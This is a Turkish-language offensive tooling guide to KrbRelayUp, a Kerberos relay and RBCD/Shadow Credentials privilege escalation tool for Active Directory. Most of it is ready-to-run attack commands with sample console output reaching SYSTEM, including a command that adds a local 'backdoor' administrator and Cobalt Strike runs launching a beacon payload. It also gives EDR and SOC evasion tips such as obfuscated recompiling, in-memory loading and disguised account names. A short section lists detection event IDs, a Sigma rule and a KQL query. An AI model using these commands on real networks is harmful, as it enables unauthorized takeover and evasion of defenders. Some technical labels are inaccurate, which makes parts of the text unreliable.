# KrbRelayUp

> **Kategori:** [5. NTLM ve Kerberos Relay Motorları](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** KrbRelay, RBCD (Kaynak Tabanlı Kısıtlı Yetki Devri), Shadow Credentials ve Rubeus (S4U2Proxy/PTT) tekniklerini tek bir çatı altında birleştiren, Active Directory ortamındaki standart bir etki alanı kullanıcısından saniyeler içinde yerel `NT AUTHORITY\SYSTEM` haklarına ulaşmayı sağlayan hepsi bir arada (All-in-One) yerel yetki yükseltme (LPE) otomasyon aracı.

---

## 1. Genel Bakış ve Amaç

Active Directory ortamlarında düşük yetkili bir etki alanı kullanıcısından yerel yönetici veya `NT AUTHORITY\SYSTEM` yetkilerine yükselmek (Local Privilege Escalation - LPE) geleneksel olarak Potato türevi araçlarla (`JuicyPotato`, `SweetPotato`, `PrintSpoofer`) gerçekleştirilmekteydi. Ancak bu araçların büyük kısmı ya `SeImpersonatePrivilege` / `SeAssignPrimaryTokenPrivilege` gibi özel işletim sistemi ayrıcalıklarına ihtiyaç duyar ya da Microsoft'un DCOM/RPC mimarisinde yaptığı yama ve sıkılaştırmalar (KB5005413, DCOM Hardening vb.) nedeniyle modern Windows 10/11 ve Server 2019/2022 sistemlerde çalışmaz hale gelmiştir.

**`KrbRelayUp`** (Dec0ne tarafından geliştirilen), Cube0x0'ın `KrbRelay` motorunu, Elad Shamir'in RBCD saldırı metodolojisini, Will Schroeder'in `Rubeus` Kerberos kütüphanesini ve Shadow Credentials tekniklerini bir araya getirerek bu kısıtlamaları tamamen ortadan kaldıran devrimsel bir araçtır. Araç, kurban makinede hiçbir özel ayrıcalığa (`SeImpersonate` vb.) ihtiyaç duymaksızın, standart bir etki alanı kullanıcısının haklarıyla yerel `SYSTEM` hesabını Kerberos üzerinden tetikler, etki alanı denetleyicisinin LDAP servisine relay eder, makine hesabına RBCD veya Shadow Credentials enjekte eder, ardından S4U2Self ve S4U2Proxy bilet değişimi yaparak yerel `Administrator` veya `SYSTEM` bağlamında yeni bir süreç ya da servis başlatır. Tüm bu 6 adımlı karmaşık saldırı zincirini 5 ila 10 saniye içinde otonom olarak tamamlar.

### Mimari Akış Şeması

```
[ Standart Domain User Bağlamı (CMD / PowerShell / Beacon) ]
       │
       │ (1) KrbRelayUp 'relay' Modu Başlatılır
       ▼
┌─────────────────────────────────────────────────────────────┐
│ 1. ADIM: Bilgisayar Hesabı Oluşturma (MAQ > 0)             │
│    LDAP üzerinden sahte bir makine hesabı açılır: KrbSC$     │
└─────────────────────────────────────────────────────────────┘
       │
       ▼
┌─────────────────────────────────────────────────────────────┐
│ 2. ADIM: Yerel Kerberos AP-REQ Relay (KrbRelay Motoru)     │
│    COM/DCOM tetiklenir, yerel SYSTEM AP-REQ bileti alır.   │
│    Bilet DC LDAP/LDAPS (Port 389/636) servisine iletilir.   │
└─────────────────────────────────────────────────────────────┘
       │
       ▼
┌─────────────────────────────────────────────────────────────┐
│ 3. ADIM: RBCD Yetki Devri Yapılandırması                   │
│    Yerel makinenin 'msDS-AllowedToActOnBehalfOfOtherIdentity'│
│    özniteliğine KrbSC$ hesabı eklenir.                      │
└─────────────────────────────────────────────────────────────┘
       │
       ▼
┌─────────────────────────────────────────────────────────────┐
│ 4. ADIM: S4U2Self & S4U2Proxy Bilet Değişimi (Rubeus)       │
│    KrbSC$ adına Administrator için CIFS/HOST bileti alınır. │
└─────────────────────────────────────────────────────────────┘
       │
       ▼
┌─────────────────────────────────────────────────────────────┐
│ 5. ADIM: Pass-the-Ticket (PTT) ve Servis Başlatma           │
│    Bilet mevcut oturuma enjekte edilir (KRB_CRED).          │
│    Hedef makinede SYSTEM yetkisiyle yeni servis açılır.     │
└─────────────────────────────────────────────────────────────┘
       │
       ▼
[ NT AUTHORITY\SYSTEM Kabuğu veya Komut Yürütme Başarılı! ]
```

### Neden Önemli?

| Yetenek / Özellik | Açıklama | Operasyonel Değeri |
|---|---|---|
| **Sıfır Özel Ayrıcalık Şartı** | `SeImpersonate` veya yerel admin hakkı gerektirmez; standart Domain Users üyesi yeterlidir. | En kısıtlı Active Directory kullanıcısından doğrudan yerel SYSTEM haklarına zıplama sağlar. |
| **Tam Otonom Saldırı Zinciri** | 4 ayrı aracı (`KrbRelay`, `New-MachineAccount`, `Rubeus`, `SC.exe`) tek bir ikilide birleştirir. | Operatörün zaman kaybetmesini ve hata yapmasını engeller, operasyonel hızı 10 katına çıkarır. |
| **Shadow Credentials Desteği** | Etki alanında `MachineAccountQuota = 0` olduğunda RBCD yerine msDS-KeyCredentialLink kullanır. | MAQ sıkılaştırması yapılmış ortamlarda dahi yetki yükseltmeyi sürdürür. |
| **Yerleşik Temizlik Mekanizması** | Saldırı bittiğinde oluşturulan bilgisayar hesabını ve RBCD özniteliğini otomatik temizler. | Active Directory üzerinde kalıcı iz bırakmayarak tespit edilme riskini azaltır. |
| **In-Memory Çalışma Desteği** | Cobalt Strike, Sliver veya Mythic C2 üzerinden `execute-assembly` ile tamamen bellekte koşar. | Diske dosya bırakmadığı için klasik antivirüs taramalarını atlatır. |

### LPE Araçları Karşılaştırması

| Özellik | KrbRelayUp | KrbRelay | PrintSpoofer | JuicyPotato | GodPotato |
|---|---|---|---|---|---|
| **Gereken Hak** | Standart Domain User | Standart Domain User | `SeImpersonatePrivilege` | `SeImpersonatePrivilege` | `SeImpersonatePrivilege` |
| **Windows 11 / Server 2022** | Desteklenir | Desteklenir | Desteklenir | Desteklenmez (Yamalandı) | Desteklenir |
| **AD Etki Alanı Şartı** | Evet (AD Hesabı) | Evet (AD Hesabı) | Hayır (Standalone) | Hayır (Standalone) | Hayır (Standalone) |
| **Araç Sayısı / Karmaşıklık**| Tek Araç (Hepsi Bir Arada)| Manuel Rubeus gerektirir| Tek Araç | Tek Araç | Tek Araç |
| **İstismar Vektörü** | Kerberos Relay + RBCD | Kerberos AP-REQ Relay | Named Pipe Impersonation | DCOM OXID Reflection | DCOM Storage Impersonation |
| **Otomatik Temizlik** | Evet (Dahili) | Hayır | Gerekmez | Gerekmez | Gerekmez |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

```bash
KrbRelayUp.exe <MOD> [SEÇENEKLER]
```

### Desteklenen Modlar (Subcommands)

- **`relay`**: Varsayılan mod. Makine hesabı oluşturur, KrbRelay ile yerel SYSTEM AP-REQ biletini relay eder, RBCD yazar, S4U2Proxy bileti alır ve SYSTEM olarak belirtilen komutu çalıştırır.
- **`spawn`**: Önceden elde edilmiş bir Kerberos bileti veya RBCD konfigürasyonu üzerinden doğrudan SYSTEM kabuğu başlatır.
- **`clean`**: Başarısız veya yarıda kalmış operasyonlardan kalan sahte makine hesaplarını ve RBCD özniteliklerini temizler.

### Kritik Parametre Tablosu

| Parametre | Açıklama | Örnek Değer |
|---|---|---|
| `-d, --domain` | Hedef Active Directory etki alanı FQDN adı. | `-d corp.local` |
| `-dc, --dc-ip` | Etki alanı denetleyicisinin IP adresi veya FQDN adı. | `-dc 192.168.1.10` |
| `-c, --computer-name` | Oluşturulacak geçici bilgisayar hesabının adı (Varsayılan: Rastgele). | `-c EVILPC$` |
| `-p, --computer-password`| Oluşturulacak geçici bilgisayar hesabının parolası. | `-p Password123!` |
| `-m, --method` | Kullanılacak sömürü yöntemi: `rbcd` (Varsayılan) veya `shadow` (Shadow Credentials). | `-m shadow` |
| `-clsid` | COM istemcisini tetiklemek için kullanılacak DCOM sınıf tanıtıcısı (GUID). | `-clsid {90f18417-...}` |
| `-port` | Yerel dinleyicinin bağlanacağı TCP portu (Varsayılan: 12345 veya rastgele). | `-port 45678` |
| `-e, --executable` | SYSTEM yetkileriyle çalıştırılacak hedef yürütülebilir dosya (Varsayılan: `cmd.exe`). | `-e cmd.exe` |
| `-a, --arguments` | Hedef yürütülebilir dosyaya aktarılacak komut satırı argümanları. | `-a "/c whoami > C:\pwn.txt"`|
| `-nowrap` | Çıktı metinlerini ekrana sığdırmak için sarmalamayı kapatır. | Bayrak |
| `--impersonate` | Bilet taklidi yapılacak kullanıcı adı (Varsayılan: `Administrator`). | `--impersonate Administrator`|
| `--timeout` | LDAP ve Kerberos yanıtları için bekleme zaman aşımı süresi (saniye). | `--timeout 15` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Standart Domain Kullanıcısından Tek Komutla SYSTEM Kabuğu Açma (Full Relay)

Etki alanına dahil edilmiş bir Windows 10/11 iş istasyonunda standart bir kullanıcı oturumundayken (`CORP\jdoe`), KrbRelayUp tek satırla çalıştırılır. Sistem otomatik olarak geçici bir bilgisayar hesabı oluşturur, Kerberos AP-REQ paketini LDAP'a relay eder, RBCD kurar ve interaktif bir SYSTEM komut istemi başlatır.

```cmd
:: Standart kullanıcı oturumunda tek komut:
KrbRelayUp.exe relay -d corp.local -dc 192.168.1.10
```

**KrbRelayUp Konsol Çıktısı Analizi:**

```text
  _  ___     _     ____      _             _   _       
 | |/ /     | |   |  _ \ ___| | __ _ _   _| | | |_ __  
 | ' / _____| |   | |_) / _ \ |/ _` | | | | | | | '_ \ 
 | . \|_____| |___|  _ <  __/ | (_| | |_| | |_| | |_) |
 |_|\_\     |_____|_| \_\___|_|\__,_|\__, |\___/| .__/ 
                                     |___/      |_|    
    By Dec0ne (@Dec0ne) - v1.0.2

[+] Domain: corp.local
[+] Domain Controller: 192.168.1.10
[+] MachineAccountQuota check passed! (MAQ = 10)
[+] Creating Fake Computer Account: KRBSC_A7B2$...
[+] Fake Computer Account created successfully with password: KrbPass_987654!
[+] Using CLSID: {90f18417-f0f1-484e-9d3c-59dceee5dbd8}
[+] Starting local COM/RPC listener on 127.0.0.1:12345...
[+] Coercing NT AUTHORITY\SYSTEM authentication...
[*] Received Kerberos AP-REQ connection from WORKSTATION01$!
[+] Extracted AP-REQ token targeting ldap/192.168.1.10
[+] Relaying token to LDAP service (192.168.1.10:389)...
[+] Authentication as WORKSTATION01$ successful!
[+] Configuring msDS-AllowedToActOnBehalfOfOtherIdentity on WORKSTATION01$...
[+] RBCD successfully configured!
[+] Requesting Kerberos TGT for KRBSC_A7B2$...
[+] Requesting S4U2Self ticket for Administrator...
[+] Requesting S4U2Proxy service ticket for cifs/workstation01.corp.local...
[+] Impersonated Service Ticket received successfully!
[+] Injecting Kerberos ticket into current logon session (PTT)...
[+] Ticket successfully injected!
[+] Creating Windows Service 'KrbRelayUp_Svc' to spawn cmd.exe...
[+] Service created and started!

Microsoft Windows [Version 10.0.19045.3803]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

---

### Senaryo 2: MachineAccountQuota = 0 Durumunda Shadow Credentials Kullanarak LPE

Etki alanı yöneticileri `MachineAccountQuota` değerini 0 yaparak standart kullanıcıların yeni makine hesabı açmasını engellemişse, RBCD yerine `-m shadow` parametresiyle Shadow Credentials tekniği devreye sokulur.

```cmd
KrbRelayUp.exe relay -d corp.local -dc 192.168.1.10 -m shadow -e cmd.exe
```

**Adım Adım Konsol Çıktısı:**

```text
[!] MachineAccountQuota is 0! Switching to Shadow Credentials mode (-m shadow).
[+] Generating RSA 2048-bit Certificate for WORKSTATION01$...
[+] Coercing SYSTEM via CLSID {90f18417-f0f1-484e-9d3c-59dceee5dbd8}...
[*] Relaying Kerberos token to LDAP dc01.corp.local...
[+] Successfully appended msDS-KeyCredentialLink to WORKSTATION01$!
[+] Authenticating via PKINIT with injected certificate...
[+] TGT for WORKSTATION01$ obtained successfully!
[+] Elevating to NT AUTHORITY\SYSTEM...
[+] Spawning cmd.exe as SYSTEM!
```

---

### Senaryo 3: Belirli Bir Payload veya Komut Satırı Yürütme

İnteraktif kabuk açmak yerine, doğrudan bir C2 Beacon yükleyicisini (`beacon.exe`) veya yerel yönetici ekleme komutunu SYSTEM olarak çalıştırmak için:

```cmd
KrbRelayUp.exe relay -d corp.local -dc 192.168.1.10 -e "C:\Windows\System32\cmd.exe" -a "/c net user backdoor Pass12345! /add && net localgroup administrators backdoor /add"
```

---

### Senaryo 4: Cobalt Strike Beacon Üzerinden Bellekte (In-Memory) Koşturma

`execute-assembly` modülü kullanılarak disk üzerinde hiçbir dosya bırakılmadan LPE zinciri işletilir.

```text
beacon> execute-assembly C:\Tools\KrbRelayUp.exe relay -d corp.local -dc 192.168.1.10 -e C:\Windows\Temp\beacon.exe
```

---

### Senaryo 5: Başarısız Operasyon Sonrası Kalıntıları Temizleme (Clean Modu)

Ağ kesintisi veya süreç iptali nedeniyle etki alanında kalan geçici bilgisayar hesabını ve makine özniteliğini temizlemek için:

```cmd
KrbRelayUp.exe clean -d corp.local -dc 192.168.1.10 -c KRBSC_A7B2$
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Belirti | Kök Neden | Kesin Çözüm Adımı |
|---|---|---|
| `MachineAccountQuota exceeded / MAQ=0` | Etki alanında standart kullanıcıların makine hesabı ekleme kotası tükenmiş veya 0 olarak sınırlandırılmış. | Komuta `-m shadow` ekleyerek Shadow Credentials yöntemine geçiş yapın. |
| `KRB_AP_ERR_S_PRINCIPAL_UNKNOWN (7)` | İstemcinin talep ettiği SPN etki alanı denetleyicisi tarafından tanınmıyor (DNS/FQDN hatası). | `-dc` parametresine IP yerine mutlaka DC'nin tam etki alanı adını (`dc01.corp.local`) verin. |
| `RPC_S_SERVER_UNAVAILABLE (0x800706BA)` | DCOM nesnesi başlatılamadı veya yerel RPC servisi kilitlendi. | `-clsid` bayrağı ile farklı bir CLSID GUID değeri belirtin veya `-port` numarasını değiştirin. |
| `Service creation failed / OpenSCManager error 5` | S4U2Proxy biletinde CIFS/HOST yetkisi eksik veya PTT oturumu başarısız oldu. | Kurban makinede yerel UAC/Firewall durumunu inceleyin; biletin `Administrator` adına talep edildiğinden emin olun (`--impersonate Administrator`). |
| `LDAP error: strongAuthRequired / CBT Failure` | DC üzerinde LDAP Channel Binding Token (CBT) ve Kerberos EPA zorunlu kılınmış. | LDAPS (Port 636) üzerinden SSL tüneli zorlayın veya CBT koruması olmayan başka bir DC'ye yönelin. |
| `Process terminated by Defender / EDR` | KrbRelayUp ikilisi popüler EDR motorları (Defender, CrowdStrike) tarafından imza bazlı yakalandı. | Kaynak kodunu yeniden derleyin (Costura/Fody paketlerini temizleyin, değişken adlarını gizleyin) veya doğrudan bellek içi Donut/In-Memory Loader kullanın. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
        GÜRÜLTÜ SEVİYESİ: ÇOK YÜKSEK (HIZLI & ÇOKLU ARTEFAKT)
──────────────────────────────────────────────────────────────────
[ Windows Logları ] : Event ID 4720, 4738, 4768, 4769, 7045 (Servis)
[ Süreç İmzası ]    : Kısa ömürlü rastgele Windows Servisi (Event ID 7045)
[ EDR / AV ]        : CLSID COM reflection, Bellek içi .NET aktivitesi
[ Sysmon ]          : Event ID 1 (Process Creation - SYSTEM cmd.exe)
```

### 5.1 Bırakılan İzler (Artifacts & Event Logs)

1. **Windows Security Event ID 4720 (A user account was created):**
   - Etki alanında standart kullanıcı tarafından açılan geçici makine hesabı (`KRBSC$...$`).
2. **Windows Security Event ID 4738 (A user account was modified):**
   - Kurban makine nesnesinde `msDS-AllowedToActOnBehalfOfOtherIdentity` alanına yeni bir SID değeri yazıldığı an loglanır.
3. **Windows Security Event ID 4768 & 4769 (Kerberos Ticket Operations):**
   - Geçici makine hesabı için TGT talebi (4768) ve hemen ardından yerel makine adına S4U2Proxy ile `Administrator` için TGS talebi (4769).
4. **System Event ID 7045 (A service was installed in the system):**
   - SYSTEM kabuğu açmak için oluşturulan geçici servis (`KrbRelayUp_Svc`).
5. **Sysmon Event ID 1 (Process Creation):**
   - `services.exe` alt süreci olarak başlatılan `cmd.exe` veya belirtilen yürütülebilir dosya (`ParentImage: C:\Windows\System32\services.exe`).

### 5.2 Ağ ve EDR İmzaları

- **LDAP Ağ Trafiği:** 5 saniyelik dar bir zaman aralığında makine hesabı oluşturma, öznitelik güncelleme ve silme istekleri SIEM anomali alarmlarını tetikler.
- **Süreç Belleği İmzası:** Standart kullanıcı sürecinin belleğinde Rubeus ve KrbRelay string dizgilerinin bulunması bellek tarayıcıları (Memory Scanner) tarafından yakalanır.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Araçtaki Karşılığı |
|---|---|---|
| **T1068** | Exploitation for Privilege Escalation | COM ve Kerberos relay tasarım zafiyetini birleştirerek LPE elde etme. |
| **T1558.003** | Subverting Trust: Kerberos Ticket Manipulation (RBCD) | S4U2Proxy bilet manipülasyonu ile Administrator biletine ulaşma. |
| **T1543.003** | Create or Modify System Process: Windows Service | SYSTEM yetkisinde komut çalıştırmak için dinamik servis kurma. |
| **T1557.001** | Adversary-in-the-Middle | Yerel RPC trafiğini LDAP servisine relay etme. |
| **T1136.002** | Create Account: Domain Account | LDAP üzerinden sahte makine hesabı üretme. |

### 5.4 OPSEC Risk ve Önlem Tablosu

| Tespit Riski | Önlem ve Operasyonel Tavsiye |
|---|---|
| **Rastgele Bilgisayar Hesabı Adı** | `KRBSC_XXXX$` gibi belirgin isimler SOC ekipleri tarafından kolayca fark edilir. `-c` ile ortama uygun meşru bir isim (örn. `DESKTOP-98BFK2$`) belirleyin. |
| **Windows Servisi Oluşturma (7045)** | Dinamik servis oluşturmak EDR'lar için en parlak uyarıdır. Mümkünse `-e` parametresiyle servis yerine mevcut süreçlere token enjeksiyonu yöntemini tercih edin. |
| **Kalıntı Bırakma** | Saldırı başarılı olduktan sonra temizlik adımının (`clean`) başarıyla çalıştığını doğrulayın. |
| **Derlenmiş İkili Tespiti** | GitHub'dan indirilen hazır release ikilisini asla kullanmayın; kod üzerinde obfuscation uygulayarak derleyin. |

### 5.5 Savunma Karşılığı (Blue Team / KQL & Sigma)

**Sigma Kuralı — KrbRelayUp LPE Zinciri Tespiti (RBCD + Servis Oluşturma):**

```yaml
title: KrbRelayUp Local Privilege Escalation Detection
status: experimental
description: Detects service creation immediately following computer account creation and RBCD modification.
logsource:
  product: windows
  service: system
detection:
  selection_service:
    EventID: 7045
    ServiceName|contains: 'KrbRelayUp'
  condition: selection_service
level: critical
```

**Microsoft Sentinel (KQL) — Saniyeler İçinde Makine Hesabı Oluşturma ve RBCD Manipülasyonu:**

```kql
let timeframe = 5m;
SecurityEvent
| where TimeGenerated >= ago(timeframe)
| where EventID == 4720 and TargetUserName matches regex @"\$$"
| project AccountCreationTime = TimeGenerated, NewComputerAccount = TargetUserName, SubjectUser = SubjectUserName
| join kind=inner (
    SecurityEvent
    | where TimeGenerated >= ago(timeframe)
    | where EventID == 4738
    | where AttributeName == "msDS-AllowedToActOnBehalfOfOtherIdentity"
    | project RBCDTime = TimeGenerated, TargetComputer = TargetUserName
) on $left.SubjectUser == $right.TargetComputer
| project AccountCreationTime, RBCDTime, SubjectUser, NewComputerAccount, TargetComputer
```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

### Komut 1: Tek Satırda Tam Otomatik LPE (SYSTEM CMD Açma)
```cmd
KrbRelayUp.exe relay -d corp.local -dc 192.168.1.10
```
- **Ne Yapar?** Sahte bilgisayar hesabı oluşturur, yerel SYSTEM AP-REQ'i LDAP'a relay eder, RBCD yazar, S4U2Proxy ile Administrator bileti alır ve etkileşimli bir SYSTEM komut istemi başlatır.
- **Ne Zaman Kullanılır?** Standart domain user haklarına sahip olunduğunda ve yerel SYSTEM haklarına acil ihtiyaç duyulduğunda.
- **Parametreler:** `-d`: Etki alanı FQDN, `-dc`: Etki alanı denetleyicisi IP adresi.

### Komut 2: Shadow Credentials Yoluyla Yetki Yükseltme (MAQ=0)
```cmd
KrbRelayUp.exe relay -d corp.local -dc dc01.corp.local -m shadow
```
- **Ne Yapar?** Bilgisayar hesabı açmadan doğrudan kurban makinenin LDAP nesnesine `msDS-KeyCredentialLink` sertifikası enjekte eder ve PKINIT ile SYSTEM biletine ulaşır.
- **Ne Zaman Kullanılır?** `MachineAccountQuota` kısıtlaması nedeniyle yeni bilgisayar hesabı açılamayan ortamlarda.
- **Parametreler:** `-m shadow`: Gölge kimlik doğrulama modu.

### Komut 3: SYSTEM Yetkisiyle Arka Planda Özel Payload Başlatma
```cmd
KrbRelayUp.exe relay -d corp.local -dc 192.168.1.10 -e "C:\Windows\Temp\beacon.exe"
```
- **Ne Yapar?** İnteraktif konsol yerine belirtilen C2 Beacon veya ajan dosyasını NT AUTHORITY\SYSTEM haklarında yeni bir servis olarak başlatır.
- **Ne Zaman Kullanılır?** Uzaktan GUI veya konsol erişimi olmayan C2 seanslarında ayrıcalık yükseltmek için.
- **Parametreler:** `-e`: Çalıştırılacak yürütülebilir dosya yolu.

### Komut 4: Özel Makine Hesabı Adı ve Parolası Tanımlama (OPSEC)
```cmd
KrbRelayUp.exe relay -d corp.local -dc 192.168.1.10 -c "DESKTOP-OPSEC$" -p "P@ssw0rd2026!"
```
- **Ne Yapar?** Varsayılan dikkat çekici `KRBSC_...$` adı yerine ortama uygun kurumsal görünümlü bir makine hesabı ismi ve güçlü parola belirler.
- **Ne Zaman Kullanılır?** SIEM ve SOC tespit mekanizmalarını atlatmak için operasyonel güvenlik gerektiğinde.
- **Parametreler:** `-c`: Bilgisayar hesabı adı, `-p`: Hesap parolası.

### Komut 5: Cobalt Strike İçinden In-Memory LPE
```text
beacon> execute-assembly C:\Tools\KrbRelayUp.exe relay -d corp.local -dc dc01.corp.local -e C:\Windows\System32\cmd.exe -a "/c whoami > C:\Temp\who.txt"
```
- **Ne Yapar?** Aracı yerel diske yazmadan doğrudan Beacon belleği üzerinden koşturur ve belirtilen argümanla komutu icra eder.
- **Ne Zaman Kullanılır?** Disk bazlı EDR antivirüs çözümlerini atlatmak amacıyla.
- **Parametreler:** Cobalt Strike dahili `execute-assembly` altyapısı, `-a`: Komut argümanları.

### Komut 6: Başarısız Oturum Kalıntılarını Manuel Temizleme
```cmd
KrbRelayUp.exe clean -d corp.local -dc 192.168.1.10 -c "DESKTOP-OPSEC$"
```
- **Ne Yapar?** Belirtilen sahte bilgisayar hesabını Active Directory'den siler ve yerel makinenin `msDS-AllowedToActOnBehalfOfOtherIdentity` alanını temizler.
- **Ne Zaman Kullanılır?** Operasyon yarıda kesildiğinde veya geride iz bırakmamak için manuel temizlik gerektiğinde.
- **Parametreler:** `clean`: Temizlik alt komutu, `-c`: Silinecek makine hesabı.

### Komut 7: Farklı Bir CLSID ile Tetikleme Yapma
```cmd
KrbRelayUp.exe relay -d corp.local -dc 192.168.1.10 -clsid {4f32d5f0-bd3e-11d1-bb21-00c04fa30080}
```
- **Ne Yapar?** Varsayılan DCOM nesnesi engellenmiş veya kısıtlanmış sistemlerde alternatif bir CLSID GUID değeri üzerinden kurban servisi tetikler.
- **Ne Zaman Kullanılır?** Varsayılan tetikleyicide RPC veya CLSID hatası alındığında.
- **Parametreler:** `-clsid`: Özel COM sınıf tanıtıcısı.

### Komut 8: Yerel Dinleyici Portunu Değiştirerek Çalıştırma
```cmd
KrbRelayUp.exe relay -d corp.local -dc 192.168.1.10 -port 55555
```
- **Ne Yapar?** Yerel dinleyici soketini belirtilen rastgele bir TCP portuna bağlar.
- **Ne Zaman Kullanılır?** Standart portlarda çakışma veya güvenlik yazılımı filtrelemesi olduğunda.
- **Parametreler:** `-port`: Yerel dinleme portu.

---

## Kaynaklar

- **Resmi GitHub Reposu:** [Dec0ne / KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp)
- **Cube0x0 / KrbRelay:** [Cube0x0 / KrbRelay Reposu](https://github.com/Cube0x0/KrbRelay)
- **HarmJ0y / Rubeus:** [GhostPack / Rubeus Reposu](https://github.com/GhostPack/Rubeus)
- **Elad Shamir Araştırması:** [Wagging the Dog: Abusing Resource-Based Constrained Delegation](https://posts.specterops.io/wagging-the-dog-abusing-resource-based-constrained-delegation-a313e68b35c0)

---

> **Önceki:** [← KrbRelay](./KrbRelay.md) · **Sonraki:** [Rubeus (Kategori 06) →](../Kategori_06_Kerberos_Protokol_Cephaneligi/Rubeus.md)
